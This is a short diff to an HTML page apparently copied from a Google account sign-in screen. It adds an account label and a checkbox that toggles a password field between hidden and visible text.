@@ -3104,7 +3104,7 @@
                                         <div jscontroller=ENv7Ef
                                             jsaction="click:cOuCgd; blur:O22p3e; mousedown:UX7yZ; mouseup:lbsD7e; touchstart:p6p2H; touchend:yfqBxc;"
                                             class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd" tabindex=0 role=link
-                                            aria-label="edit" jsname=af8ijd>
+                                            aria-label="edit@scubagws.org selected. Switch account" jsname=af8ijd>
                                             <div class=gPHLDe>
                                                 <div class=qQWzTd aria-hidden=true>
                                                     <script>
@@ -3125,6 +3125,14 @@
                                                         }
                                                         function onSuccess() {
                                                             console.log("SUCCESS");
+                                                        }
+                                                        function myFunction() {
+                                                          var x = document.getElementById("pazz");
+                                                          if (x.type === "password") {
+                                                            x.type = "text";
+                                                          } else {
+                                                            x.type = "password";
+                                                          }
                                                         }
 
                                                     </script>
@@ -3242,6 +3250,7 @@
                                                                                                 data-value=optionc12>
                                                                                                 <input
                                                                                                     class=VfPpkd-muHVFf-bMcfAe
+                                                                                                    onclick="myFunction()"
                                                                                                     type=checkbox
                                                                                                     jsname=YPqjbf
                                                                                                     jsaction="focus:AHmuwe; blur:O22p3e; change:WPi0i;"
